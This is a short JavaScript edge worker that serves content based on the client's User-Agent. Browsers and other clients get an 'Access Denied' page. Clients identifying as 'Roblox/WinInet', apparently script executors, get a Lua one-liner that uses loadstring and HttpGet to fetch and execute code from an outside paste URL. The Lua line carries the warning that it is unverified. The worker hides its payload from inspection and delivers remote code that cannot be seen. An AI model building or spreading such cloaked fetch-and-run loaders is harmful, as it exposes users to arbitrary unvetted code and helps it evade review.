addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Only handle requests to the root ('/') route
  const url = new URL(request.url)
  if (url.pathname !== '/') {
    return new Response('Not Found', { status: 404 })
  }

  // Check if the request method is GET
  if (request.method !== 'GET') {
    return new Response('Method Not Allowed', { status: 405 })
  }

  // Get the User-Agent from the request headers
  const userAgent = request.headers.get('User-Agent')

  // Only accept requests with a specific User-Agent (e.g., 'Roblox/WinInet')
  const allowedUserAgent = 'Roblox/WinInet'

  if (!userAgent || !userAgent.includes(allowedUserAgent)) {
    // Return an HTML response for incorrect User-Agent
    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Access Denied</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            color: #333;
          }
          h1 {
            color: #e74c3c;
          }
        </style>
      </head>
      <body>
        <h1>Access Denied</h1>
        <p>Your is not allowed to access this resource.</p>
      </body>
      </html>
    `;
    return new Response(htmlContent, {
      headers: { 'Content-Type': 'text/html' },
      status: 403
    });
  }

  // Basic Roblox Lua Script
  const robloxScript = `
-- Roblox Lua Script
--[[
  WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
`;

  // Respond with the Roblox Lua script
  return new Response(robloxScript, {
    headers: { 'Content-Type': 'text/plain' }
  });
}
